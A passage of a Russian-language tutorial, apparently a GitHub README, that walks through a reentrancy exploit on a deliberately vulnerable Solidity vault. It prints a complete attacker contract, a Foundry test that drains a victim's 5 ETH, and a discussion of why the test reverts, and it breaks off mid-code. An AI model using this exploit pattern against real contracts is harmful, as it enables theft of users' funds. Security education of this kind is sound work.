+ <div class="highlight highlight-source-solidity notranslate position-relative overflow-auto" dir="auto">
+  <pre><span class="pl-c">// SPDX-License-Identifier: MIT</span>
+    <span class="pl-k">pragma solidity</span> <span class="pl-k">^</span><span class="pl-c1">0.8.0</span>;
+    
+    <span class="pl-k">import</span> <span class="pl-s">"<span class="pl-s">./PiratesGuildVault.sol</span>"</span>;
+    
+    <span class="pl-k">contract</span> <span class="pl-en">TheTraitorWithin</span> {
+        PiratesGuildVault <span class="pl-k">public</span> targetVault;
+        <span class="pl-c1">address</span> <span class="pl-k">public</span> traitor;
+        <span class="pl-c1">bool</span> <span class="pl-k">public</span> heistInProgress;
+    
+        <span class="pl-c">// События отладки</span>
+        <span class="pl-k">event <span class="pl-en">BankDebug</span></span>(<span class="pl-c1">string</span> <span class="pl-v">message</span>, <span class="pl-c1">uint256</span> <span class="pl-v">value</span>, <span class="pl-c1">uint256</span> <span class="pl-v">vaultBalance</span>);
+        <span class="pl-k">event <span class="pl-en">FallbackTriggered</span></span>(
+            <span class="pl-c1">string</span> <span class="pl-v">message</span>,
+            <span class="pl-c1">uint256</span> <span class="pl-v">value</span>,
+            <span class="pl-c1">uint256</span> <span class="pl-v">vaultBalance</span>
+        );
+    
+        <span class="pl-k">constructor</span>(<span class="pl-c1">address payable</span> <span class="pl-v">_vaultAddress</span>) {
+            targetVault <span class="pl-k">=</span> <span class="pl-en">PiratesGuildVault</span>(_vaultAddress);
+            traitor <span class="pl-k">=</span> <span class="pl-c1">msg</span>.<span class="pl-c1">sender</span>;
+        }
+    
+        <span class="pl-c">// Злоумышленник тайно присоединяется к банку в качестве доверенного лица.</span>
+        <span class="pl-k">function<span class="pl-en"> infiltrate</span></span>() <span class="pl-k">external</span> {
+            <span class="pl-k">require</span>(
+                <span class="pl-c1">msg</span>.<span class="pl-c1">sender</span> <span class="pl-k">==</span> traitor,
+                <span class="pl-s">"<span class="pl-s">Only the traitor can infiltrate the bank!</span>"</span>
+            );
+    
+            <span class="pl-k">emit</span> <span class="pl-en">BankDebug</span>(
+                <span class="pl-s">"<span class="pl-s">The traitor infiltrates the bank</span>"</span>,
+                <span class="pl-c1">0</span>,
+                <span class="pl-c1">address</span>(targetVault).balance
+            );
+    
+            targetVault.<span class="pl-en">joinGuild</span>(); <span class="pl-c">// Злоумышленник вступает в гильдию как легитимный член</span>
+        }
+    
+        <span class="pl-c">// Злоумышленник инициирует ограбление</span>
+        <span class="pl-k">function<span class="pl-en"> executeHeist</span></span>() <span class="pl-k">external</span> <span class="pl-k">payable</span> {
+            <span class="pl-k">require</span>(
+                <span class="pl-c1">msg</span>.<span class="pl-c1">sender</span> <span class="pl-k">==</span> traitor,
+                <span class="pl-s">"<span class="pl-s">Only the traitor can execute the heist!</span>"</span>
+            );
+            <span class="pl-k">require</span>(
+                <span class="pl-c1">msg</span>.<span class="pl-c1">value</span> <span class="pl-k">&gt;=</span> <span class="pl-c1">1</span> ether,
+                <span class="pl-s">"<span class="pl-s">The heist requires at least 1 ETH to proceed!</span>"</span>
+            );
+    
+            <span class="pl-c">// Лог в начале ограбления</span>
+            <span class="pl-k">emit</span> <span class="pl-en">BankDebug</span>(
+                <span class="pl-s">"<span class="pl-s">Heist begins: depositing funds into the vault</span>"</span>,
+                <span class="pl-c1">msg</span>.<span class="pl-c1">value</span>,
+                <span class="pl-c1">address</span>(targetVault).balance
+            );
+    
+            <span class="pl-c">// Внесение эфира в сокровищницу</span>
+            targetVault.<span class="pl-en">deposit</span>{value: <span class="pl-c1">msg</span>.<span class="pl-c1">value</span>}();
+    
+            <span class="pl-c">// Лог после пополнения счета</span>
+            <span class="pl-k">emit</span> <span class="pl-en">BankDebug</span>(
+                <span class="pl-s">"<span class="pl-s">Funds deposited, preparing for reentrancy attack</span>"</span>,
+                <span class="pl-c1">msg</span>.<span class="pl-c1">value</span>,
+                <span class="pl-c1">address</span>(targetVault).balance
+            );
+    
+            <span class="pl-c">// Начало кражи через реентерацию</span>
+            heistInProgress <span class="pl-k">=</span> <span class="pl-c1">true</span>;
+    
+            <span class="pl-c">// Вывод суммы депозита, чтобы запустить реентерацию</span>
+            targetVault.<span class="pl-en">withdraw</span>(<span class="pl-c1">msg</span>.<span class="pl-c1">value</span>);
+    
+            <span class="pl-c">// Обеспечение правильного завершения ограбления</span>
+            heistInProgress <span class="pl-k">=</span> <span class="pl-c1">false</span>;
+        }
+    
+        <span class="pl-c">// Злоумышленник собирает добычу после ограбления</span>
+        <span class="pl-k">function<span class="pl-en"> claimLoot</span></span>() <span class="pl-k">external</span> {
+            <span class="pl-k">require</span>(
+                <span class="pl-c1">msg</span>.<span class="pl-c1">sender</span> <span class="pl-k">==</span> traitor,
+                <span class="pl-s">"<span class="pl-s">Only the traitor can claim the stolen loot!</span>"</span>
+            );
+    
+            <span class="pl-k">emit</span> <span class="pl-en">BankDebug</span>(
+                <span class="pl-s">"<span class="pl-s">The traitor claims the stolen funds</span>"</span>,
+                <span class="pl-c1">address</span>(<span class="pl-mi">this</span>).balance,
+                <span class="pl-c1">address</span>(targetVault).balance
+            );
+    
+            <span class="pl-c1">payable</span>(traitor).<span class="pl-en">transfer</span>(<span class="pl-c1">address</span>(<span class="pl-mi">this</span>).balance);
+        }
+    
+        <span class="pl-c">// Использование receive для продолжения атаки</span>
+        <span class="pl-k">receive</span>() <span class="pl-k">external</span> <span class="pl-k">payable</span> {
+            <span class="pl-k">emit</span> <span class="pl-en">FallbackTriggered</span>(
+                <span class="pl-s">"<span class="pl-s">Receive triggered during heist</span>"</span>,
+                <span class="pl-c1">msg</span>.<span class="pl-c1">value</span>,
+                <span class="pl-c1">address</span>(targetVault).balance
+            );
+    
+            <span class="pl-k">if</span> (heistInProgress <span class="pl-k">&amp;&amp;</span> <span class="pl-c1">address</span>(targetVault).balance <span class="pl-k">&gt;</span> <span class="pl-c1">0</span>) {
+                targetVault.<span class="pl-en">withdraw</span>(<span class="pl-c1">1</span> ether); <span class="pl-c">// Continue withdrawing funds in small chunks</span>
+            }
+        }
+    }</pre>
+ </div>
+ <p dir="auto">
+  Конструктор TheTraitorWithin инициализирует личность злоумышленника и устанавливает контракт целевого
+        хранилища. Конструктор гарантирует,
+        что злоумышленник идентифицирован как развертыватель контракта и что он взаимодействует с указанным уязвимым
+        хранилищем.
+ </p>
+ <div class="highlight highlight-source-solidity notranslate position-relative overflow-auto" dir="auto">
+  <pre><span class="pl-k">constructor</span>(<span class="pl-c1">address payable</span> <span class="pl-v">_vaultAddress</span>) {
+        targetVault <span class="pl-k">=</span> <span class="pl-en">PiratesGuildVault</span>(_vaultAddress);
+        traitor <span class="pl-k">=</span> <span class="pl-c1">msg</span>.<span class="pl-c1">sender</span>;
+    }</pre>
+ </div>
+ <p dir="auto">
+  Функция infiltrate позволяет злоумышленнику присоединиться к хранилищу в качестве легитимного члена.
+        Вызвав функцию joinGuild на PiratesGuildVault,
+        вредоносный контракт получает привилегии члена хранилища, создавая основу для атаки. Он также выдает отладочное
+        событие, чтобы зафиксировать факт проникновения.
+ </p>
+ <div class="highlight highlight-source-solidity notranslate position-relative overflow-auto" dir="auto">
+  <pre><span class="pl-k">function<span class="pl-en"> infiltrate</span></span>() <span class="pl-k">external</span> {
+        <span class="pl-k">require</span>(
+            <span class="pl-c1">msg</span>.<span class="pl-c1">sender</span> <span class="pl-k">==</span> traitor,
+            <span class="pl-s">"<span class="pl-s">Only the traitor can infiltrate the bank!</span>"</span>
+        );
+    
+        <span class="pl-k">emit</span> <span class="pl-en">BankDebug</span>(
+            <span class="pl-s">"<span class="pl-s">The traitor infiltrates the bank</span>"</span>,
+            <span class="pl-c1">0</span>,
+            <span class="pl-c1">address</span>(targetVault).balance
+        );
+    
+        targetVault.<span class="pl-en">joinGuild</span>(); <span class="pl-c">// Злоумышленник вступает в гильдию как легитимный член</span>
+    }</pre>
+ </div>
+ <p dir="auto">
+  Функция executeHeist инициирует атаку, сначала внося эфир в хранилище. Это позволяет контракту
+        выглядеть как легитимным. Как только депозит внесен,
+        она запускает вывод средств, чтобы использовать уязвимость реентерабельности. Флаг heistInProgress гарантирует,
+        что функция receive будет знать, когда продолжить эксплуатацию уязвимости.
+ </p>
+ <div class="highlight highlight-source-solidity notranslate position-relative overflow-auto" dir="auto">
+  <pre><span class="pl-k">function<span class="pl-en"> executeHeist</span></span>() <span class="pl-k">external</span> <span class="pl-k">payable</span> {
+        <span class="pl-k">require</span>(
+            <span class="pl-c1">msg</span>.<span class="pl-c1">sender</span> <span class="pl-k">==</span> traitor,
+            <span class="pl-s">"<span class="pl-s">Only the traitor can execute the heist!</span>"</span>
+        );
+        <span class="pl-k">require</span>(
+            <span class="pl-c1">msg</span>.<span class="pl-c1">value</span> <span class="pl-k">&gt;=</span> <span class="pl-c1">1</span> ether,
+            <span class="pl-s">"<span class="pl-s">The heist requires at least 1 ETH to proceed!</span>"</span>
+        );
+    
+        <span class="pl-k">emit</span> <span class="pl-en">BankDebug</span>(
+            <span class="pl-s">"<span class="pl-s">Heist begins: depositing funds into the vault</span>"</span>,
+            <span class="pl-c1">msg</span>.<span class="pl-c1">value</span>,
+            <span class="pl-c1">address</span>(targetVault).balance
+        );
+    
+        targetVault.<span class="pl-en">deposit</span>{value: <span class="pl-c1">msg</span>.<span class="pl-c1">value</span>}();
+    
+        <span class="pl-k">emit</span> <span class="pl-en">BankDebug</span>(
+            <span class="pl-s">"<span class="pl-s">Funds deposited, preparing for reentrancy attack</span>"</span>,
+            <span class="pl-c1">msg</span>.<span class="pl-c1">value</span>,
+            <span class="pl-c1">address</span>(targetVault).balance
+        );
+    
+        heistInProgress <span class="pl-k">=</span> <span class="pl-c1">true</span>;
+    
+        targetVault.<span class="pl-en">withdraw</span>(<span class="pl-c1">msg</span>.<span class="pl-c1">value</span>);
+    
+        heistInProgress <span class="pl-k">=</span> <span class="pl-c1">false</span>;
+    }</pre>
+ </div>
+ <p dir="auto">
+  В этом эксплойте функция receive во вредоносном контракте стратегически используется для перехвата
+        передачи эфира во время процесса вывода средств.
+        Это позволяет злоумышленнику многократно вызывать функцию withdraw уязвимого контракта каждый раз, когда
+        вредоносный контракт получает эфир. Таким образом, атака зацикливается,
+        истощая баланс хранилища до полного исчерпания.
+ </p>
+ <p dir="auto">
+  Вот реализация функции receive во вредоносном контракте, демонстрирующая, как она поддерживает цикл
+        атаки:
+ </p>
+ <div class="highlight highlight-source-solidity notranslate position-relative overflow-auto" dir="auto">
+  <pre><span class="pl-k">receive</span>() <span class="pl-k">external</span> <span class="pl-k">payable</span> {
+        <span class="pl-k">emit</span> <span class="pl-en">FallbackTriggered</span>(
+            <span class="pl-s">"<span class="pl-s">Receive triggered during heist</span>"</span>,
+            <span class="pl-c1">msg</span>.<span class="pl-c1">value</span>,
+            <span class="pl-c1">address</span>(targetVault).balance
+        );
+    
+        <span class="pl-k">if</span> (heistInProgress <span class="pl-k">&amp;&amp;</span> <span class="pl-c1">address</span>(targetVault).balance <span class="pl-k">&gt;</span> <span class="pl-c1">0</span>) {
+            targetVault.<span class="pl-en">withdraw</span>(<span class="pl-c1">1</span> ether); <span class="pl-c">// Продолжаем выводить средства небольшими частями</span>
+        }
+    }</pre>
+ </div>
+ <div class="markdown-heading" dir="auto">
+  <h3 class="heading-element" dir="auto" tabindex="-1">
+   Проверка уязвимости в сокровище гильдии пиратов
+  </h3>
+ </div>
+ <p dir="auto">
+  В этом разделе мы используем Foundry для автоматизации процесса проверки уязвимости реентерабельности
+        в контракте Pirate's Guild Vault.
+        Мы воспользуемся возможностями Foundry, чтобы не только выполнить эксплойт, но и убедиться в том, что уязвимость
+        успешно использована.
+ </p>
+ <p dir="auto">
+  Проверка эксплойта
+ </p>
+ <div class="highlight highlight-source-solidity notranslate position-relative overflow-auto" dir="auto">
+  <pre><span class="pl-c">// SPDX-License-Identifier: MIT</span>
+    <span class="pl-k">pragma solidity</span> <span class="pl-k">^</span><span class="pl-c1">0.8.0</span>;
+    
+    <span class="pl-k">import</span> <span class="pl-s">"<span class="pl-s">forge-std/Test.sol</span>"</span>;
+    <span class="pl-k">import</span> <span class="pl-s">"<span class="pl-s">../src/PiratesGuildVault.sol</span>"</span>;
+    <span class="pl-k">import</span> <span class="pl-s">"<span class="pl-s">../src/TheTraitorWithin.sol</span>"</span>;
+    
+    <span class="pl-k">contract</span> <span class="pl-en">TraitorInBankTest</span> <span class="pl-k">is</span> <span class="pl-en">Test</span> {
+        PiratesGuildVault <span class="pl-k">public</span> vault;
+        TheTraitorWithin <span class="pl-k">public</span> traitorContract;
+    
+        <span class="pl-c1">address</span> <span class="pl-k">public </span>traitor <span class="pl-k">=</span> <span class="pl-c1">address</span>(<span class="pl-c1">0x123</span>);
+        <span class="pl-c1">address</span> <span class="pl-k">public </span>victim <span class="pl-k">=</span> <span class="pl-c1">address</span>(<span class="pl-c1">0x456</span>);
+    
+        <span class="pl-k">function<span class="pl-en"> setUp</span></span>() <span class="pl-k">public</span> {
+            <span class="pl-c">// Обеспечим злоумышленника и жертву эфиром</span>
+            vm.<span class="pl-en">deal</span>(traitor, <span class="pl-c1">10</span> ether);
+            vm.<span class="pl-en">deal</span>(victim, <span class="pl-c1">5</span> ether);
+    
+            <span class="pl-c">// Развертывание уязвимого контракта</span>
+            vault <span class="pl-k">=</span> <span class="pl-k">new</span> <span class="pl-en">PiratesGuildVault</span>();
+    
+            <span class="pl-c">// Развертывание контракт злоумышленника с его адреса </span>
+            vm.<span class="pl-en">prank</span>(traitor);
+            traitorContract <span class="pl-k">=</span> <span class="pl-k">new</span> <span class="pl-en">TheTraitorWithin</span>(<span class="pl-c1">payable</span>(<span class="pl-c1">address</span>(vault)));
+    
+            <span class="pl-c">// Жертва присоединяется к хранилищу и вносит средства</span>
+            vm.<span class="pl-en">startPrank</span>(victim);
+            vault.<span class="pl-en">joinGuild</span>();
+            vault.<span class="pl-en">deposit</span>{value: <span class="pl-c1">5</span> <span class="pl-c1">ether</span>}();
+            vm.<span class="pl-en">stopPrank</span>();
+        }
+    
+        <span class="pl-k">function<span class="pl-en"> testTraitorHeist</span></span>() <span class="pl-k">public</span> {
+            <span class="pl-c">// Убедитесь, что хранилище имеет ожидаемый баланс перед атакой</span>
+            <span class="pl-en">assertEq</span>(
+                <span class="pl-c1">address</span>(vault).balance,
+                <span class="pl-c1">5</span> ether,
+                <span class="pl-s">"<span class="pl-s">Vault initial balance incorrect</span>"</span>
+            );
+    
+            <span class="pl-c">// Злоумышленник проникает в хранилище через свой вредоносный контракт</span>
+            vm.<span class="pl-en">startPrank</span>(traitor);
+            traitorContract.<span class="pl-en">infiltrate</span>();
+    
+            <span class="pl-c">// Злоумышленник совершает ограбление</span>
+            traitorContract.<span class="pl-en">executeHeist</span>{value: <span class="pl-c1">1</span> <span class="pl-c1">ether</span>}();
+            traitorContract.<span class="pl-en">claimLoot</span>();
+    
+            console.<span class="pl-en">log</span>(<span class="pl-s">"<span class="pl-s">Final balance of the traitor:</span>"</span>, traitor.balance);
+    
+            <span class="pl-c">// Проверка баланса после ограбления</span>
+            <span class="pl-en">assertEq</span>(<span class="pl-c1">address</span>(vault).balance, <span class="pl-c1">0</span> ether, <span class="pl-s">"<span class="pl-s">Vault balance not drained</span>"</span>);
+            <span class="pl-en">assertGt</span>(
+                <span class="pl-c1">address</span>(traitor).balance,
+                <span class="pl-c1">10</span> ether,
+                <span class="pl-s">"<span class="pl-s">Traitor did not gain expected funds</span>"</span>
+            );
+            vm.<span class="pl-en">stopPrank</span>();
+        }
+    }</pre>
+ </div>
+ <div class="markdown-heading" dir="auto">
+  <h4 class="heading-element" dir="auto" tabindex="-1">
+   Подготовка тестовой среды
+  </h4>
+ </div>
+ <p dir="auto">
+  Для начала мы создали тестовую среду, в которой развернули как уязвимый контракт (PiratesGuildVault),
+        так и вредоносный контракт (TheTraitorWithin).
+        Тестовая среда имитирует реальный сценарий, назначая две роли: жертву, которая вносит эфир в хранилище, и
+        злоумышленника,
+        который использует вредоносный контракт для эксплуатации уязвимости хранилища.
+ </p>
+ <div class="highlight highlight-source-solidity notranslate position-relative overflow-auto" dir="auto">
+  <pre><span class="pl-k">function<span class="pl-en"> setUp</span></span>() <span class="pl-k">public</span> {
+        <span class="pl-c">// Обеспечим злоумышленника и жертву эфиром</span>
+        vm.<span class="pl-en">deal</span>(traitor, <span class="pl-c1">10</span> ether);
+        vm.<span class="pl-en">deal</span>(victim, <span class="pl-c1">5</span> ether);
+    
+        <span class="pl-c">// Развертывание уязвимого контракта</span>
+        vault <span class="pl-k">=</span> <span class="pl-k">new</span> <span class="pl-en">PiratesGuildVault</span>();
+    
+        <span class="pl-c">// Развертывание вредоносного контракта с адреса злоумышленника</span>
+        vm.<span class="pl-en">prank</span>(traitor);
+        traitorContract <span class="pl-k">=</span> <span class="pl-k">new</span> <span class="pl-en">TheTraitorWithin</span>(<span class="pl-c1">payable</span>(<span class="pl-c1">address</span>(vault)));
+    
+        <span class="pl-c">// Жертва присоединяется к хранилищу и вносит средства</span>
+        vm.<span class="pl-en">startPrank</span>(victim);
+        vault.<span class="pl-en">joinGuild</span>();
+        vault.<span class="pl-en">deposit</span>{value: <span class="pl-c1">5</span> <span class="pl-c1">ether</span>}();
+        vm.<span class="pl-en">stopPrank</span>();
+    }</pre>
+ </div>
+ <p dir="auto">
+  Этот сетап обеспечивает точную имитацию реального применения эксплойта. Жертва кладет в хранилище 5
+        эфиров, а злоумышленник получает необходимые ресурсы для осуществления атаки.
+        Успех подтверждается, когда баланс атакующего увеличивается с 10 до 15 эфиров, что свидетельствует о том, что
+        хранилище было опустошено.
+ </p>
+ <div class="markdown-heading" dir="auto">
+  <h4 class="heading-element" dir="auto" tabindex="-1">
+   Проведение атаки
+  </h4>
+ </div>
+ <p dir="auto">
+  Следующий шаг — симуляция атаки с помощью тестовой функции. Злоумышленник начинает с проникновения в
+        гильдию, чтобы вступить в нее как легитимный член,
+        что является необходимым условием для взаимодействия с хранилищем.
+  <code>
+   traitorContract.infiltrate();
+  </code>
+ </p>
+ <p dir="auto">
+  После успешного присоединения злоумышленник совершает ограбление, внося в хранилище 1 Ether и сразу же
+        запуская атаку реентерации, чтобы украсть все средства.
+  <code>
+   traitorContract.executeHeist{value: 1 ether}();
+  </code>
+ </p>
+ <p dir="auto">
+  После завершения атаки злоумышленник получает украденные средства по своему вредоносному контракту:
+  <code>
+   traitorContract.claimLoot();
+  </code>
+ </p>
+ <div class="markdown-heading" dir="auto">
+  <h4 class="heading-element" dir="auto" tabindex="-1">
+   Проверка результатов
+  </h4>
+ </div>
+ <p dir="auto">
+  Наконец, тест проверяет, удалось ли использовать уязвимость, сравнивая баланс хранилища и конечный
+        баланс злоумышленника с ожидаемыми значениями.
+ </p>
+ <div class="highlight highlight-source-solidity notranslate position-relative overflow-auto" dir="auto">
+  <pre><span class="pl-c">// Verify balances after the heist</span>
+    <span class="pl-en">assertEq</span>(<span class="pl-c1">address</span>(vault).balance, <span class="pl-c1">0</span> ether, <span class="pl-s">"<span class="pl-s">Vault balance not drained</span>"</span>);
+    <span class="pl-en">assertGt</span>(
+        <span class="pl-c1">address</span>(traitor).balance,
+        <span class="pl-c1">10</span> ether,
+        <span class="pl-s">"<span class="pl-s">Traitor did not gain expected funds</span>"</span>
+    );</pre>
+ </div>
+ <p dir="auto">
+  Эти утверждения гарантируют, что хранилище было полностью опустошено, а злоумышленник успешно завладел
+        средствами.
+ </p>
+ <div class="markdown-heading" dir="auto">
+  <h3 class="heading-element" dir="auto" tabindex="-1">
+   Разбор ошибок в тестах
+  </h3>
+ </div>
+ <p dir="auto">
+  Когда мы выполняем тест с помощью Forge, мы сталкиваемся с ошибкой во время симуляции атаки
+        реентерабельности. На выходе мы видим исключение с сообщением об ошибке: «Failed to send Ether!».
+        Эта проблема возникает из‑за поведения атаки реентерабельности после того, как из хранилища будет выкачан весь
+        эфир. Давайте разберемся с этим.
+ </p>
+ <div class="snippet-clipboard-content notranslate position-relative overflow-auto">
+  <pre class="notranslate"><code>forge test -v
+    forge test -vvv
+    </code></pre>
+ </div>
+ <p dir="auto">
+  Ошибка при выполнении эксплойта:
+  <a href="https://private-user-images.githubusercontent.com/146094679/423263408-0839bb9d-dd1c-484a-b13b-6a88300b1f4a.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NDUxNDg5MTIsIm5iZiI6MTc0NTE0ODYxMiwicGF0aCI6Ii8xNDYwOTQ2NzkvNDIzMjYzNDA4LTA4MzliYjlkLWRkMWMtNDg0YS1iMTNiLTZhODgzMDBiMWY0YS5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwNDIwJTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDQyMFQxMTMwMTJaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT00ZWRhNjZhYTQ4ZjcyMWMyOGE2MDA2ZDg3N2UzMGJkN2M1ZWQ5NDVhNWUxODQ0Y2NiOGQyMzE3NDEzNmE1YTdkJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.bt7LlXcksvJAXGQkHVOVhSN_gpNM6z1KIhbhSiPzhsw" rel="noopener noreferrer" target="_blank">
+   <img alt="Error1" src="https://private-user-images.githubusercontent.com/146094679/423263408-0839bb9d-dd1c-484a-b13b-6a88300b1f4a.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NDUxNDg5MTIsIm5iZiI6MTc0NTE0ODYxMiwicGF0aCI6Ii8xNDYwOTQ2NzkvNDIzMjYzNDA4LTA4MzliYjlkLWRkMWMtNDg0YS1iMTNiLTZhODgzMDBiMWY0YS5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwNDIwJTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDQyMFQxMTMwMTJaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT00ZWRhNjZhYTQ4ZjcyMWMyOGE2MDA2ZDg3N2UzMGJkN2M1ZWQ5NDVhNWUxODQ0Y2NiOGQyMzE3NDEzNmE1YTdkJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.bt7LlXcksvJAXGQkHVOVhSN_gpNM6z1KIhbhSiPzhsw" style="max-width: 100%;"/>
+  </a>
+ </p>
+ <p dir="auto">
+  Логи эксплойта:
+  <a href="https://private-user-images.githubusercontent.com/146094679/423263414-385abccd-c90b-4760-9dd0-4e3ea841337e.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NDUxNDg5MTIsIm5iZiI6MTc0NTE0ODYxMiwicGF0aCI6Ii8xNDYwOTQ2NzkvNDIzMjYzNDE0LTM4NWFiY2NkLWM5MGItNDc2MC05ZGQwLTRlM2VhODQxMzM3ZS5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwNDIwJTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDQyMFQxMTMwMTJaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT0zODM1YmE2OTg5ZTAzY2ExMGEyMjEwNThkN2QyMmNhNzk1ZjFhYjRiNGQ2NDgyNDQ4NzI2ZGQ2ZWJmOWI2ZDg1JlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.Zj9oDaZhkuqT6vBmJvgwbC0uwzQodATbuTXYg8gHs9g" rel="noopener noreferrer" target="_blank">
+   <img alt="log1" src="https://private-user-images.githubusercontent.com/146094679/423263414-385abccd-c90b-4760-9dd0-4e3ea841337e.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NDUxNDg5MTIsIm5iZiI6MTc0NTE0ODYxMiwicGF0aCI6Ii8xNDYwOTQ2NzkvNDIzMjYzNDE0LTM4NWFiY2NkLWM5MGItNDc2MC05ZGQwLTRlM2VhODQxMzM3ZS5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwNDIwJTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDQyMFQxMTMwMTJaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT0zODM1YmE2OTg5ZTAzY2ExMGEyMjEwNThkN2QyMmNhNzk1ZjFhYjRiNGQ2NDgyNDQ4NzI2ZGQ2ZWJmOWI2ZDg1JlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.Zj9oDaZhkuqT6vBmJvgwbC0uwzQodATbuTXYg8gHs9g" style="max-width: 100%;"/>
+  </a>
+ </p>
+ <div class="markdown-heading" dir="auto">
+  <h4 class="heading-element" dir="auto" tabindex="-1">
+   Почему возникает исключение
+  </h4>
+ </div>
+ <p dir="auto">
+  Во время рекурсивной атаки вредоносный контракт постоянно вызывает функцию withdraw уязвимого
+        контракта (PiratesGuildVault). Каждый рекурсивный вызов успешно выводит эфир из хранилища,
+        пока его баланс не достигнет нуля. Однако проблема заключается в том, как реализована функция withdraw.
+ </p>
+ <p dir="auto">
+  После того как хранилище полностью опустошено, атака не сразу прекращается из‑за повторного вызова
+        функции receive во время эксплойта. Ключевая проблема заключается в том,
+        как поток исполнение возвращается к уязвимому контракту. После каждой итерации функции receive управление
+        возвращается к исходной функции withdraw, которая продолжает выполняться,
+        как будто в хранилище все еще есть средства. Это приводит к попыткам вычесть эфир из уже пустого баланса, что в
+        итоге вызывает исключение.
+ </p>
+ <div class="highlight highlight-source-solidity notranslate position-relative overflow-auto" dir="auto">
+  <pre>(<span class="pl-c1">bool</span> <span class="pl-v">success</span>, ) <span class="pl-k">=</span> <span class="pl-c1">msg</span>.<span class="pl-c1">sender</span>.<span class="pl-c1">call</span>{value: amount}(<span class="pl-s">""</span>);
+    <span class="pl-k">require</span>(success, <span class="pl-s">"<span class="pl-s">Failed to send Ether!</span>"</span>);</pre>
+ </div>
+ <p dir="auto">
+  В данном случае контракт пытается перевести эфир, хотя баланс хранилища равен нулю. В результате:
+ </p>
+ <ol dir="auto">
+  <li>
+   <p dir="auto">
+    <strong>
+     Арифметическое переполнение:
+    </strong>
+    Когда функция пытается вычесть amount из
+                member.balance и totalVaultBalance, она сталкивается с состоянием,
+                когда вычитание приводит к отрицательному числу. Арифметические операции Solidity в таких случаях
+                выбрасывают исключение.
+   </p>
+  </li>
+  <li>
+   <p dir="auto">
+    <strong>
+     Неудачная передача эфира:
+    </strong>
+    Поскольку в хранилище больше нет эфира, операция
+                перевода (call) завершается ошибкой, что приводит к возврату функции с сообщением: «Failed to send
+                Ether!».
+   </p>
+  </li>
+ </ol>
+ <div class="markdown-heading" dir="auto">
+  <h4 class="heading-element" dir="auto" tabindex="-1">
+   Наблюдение за ошибками при тестировании
+  </h4>
+ </div>
+ <p dir="auto">
+  Результаты Forge‑теста наглядно демонстрируют эту проблему. После слива всего эфира рекурсивная атака
+        продолжается,
+        и уязвимая функция терпит неудачу при попытке вычесть остатки баланса или перевести эфир. Это поведение наглядно
+        видно в трассировке:
+ </p>
+ <ol dir="auto">
+  <li>
+   <p dir="auto">
+    Эфир выкачивается рекурсивно, пока баланс не достигнет нуля.
+   </p>
+  </li>
+  <li>
+   <p dir="auto">
+    Дальнейшие рекурсивные вызовы приводят к возврату из‑за арифметических ошибок или неудавшихся
+                переводов.
+   </p>
+  </li>
+ </ol>
+ <div class="markdown-heading" dir="auto">
+  <h4 class="heading-element" dir="auto" tabindex="-1">
+   Решение проблемы в уязвимом контракте
+  </h4>
+ </div>
+ <p dir="auto">
+  Чтобы тест не провалился таким образом, мы можем модифицировать функцию withdraw уязвимого контракта,
+        чтобы обработать пограничные случаи,
+        когда баланс недостаточен для перевода. Можно добавить следующую условную логику, чтобы предотвратить
+        выполнение, когда баланс уже исчерпан:
+ </p>
+ <div class="highlight highlight-source-solidity notranslate position-relative overflow-auto" dir="auto">
+  <pre>(<span class="pl-c1">bool</span> <span class="pl-v">success</span>, ) <span class="pl-k">=</span> <span class="pl-c1">msg</span>.<span class="pl-c1">sender</span>.<span class="pl-c1">call</span>{value: amount}(<span class="pl-s">""</span>);
+    <span class="pl-k">require</span>(success, <span class="pl-s">"<span class="pl-s">Failed to send Ether!</span>"</span>);
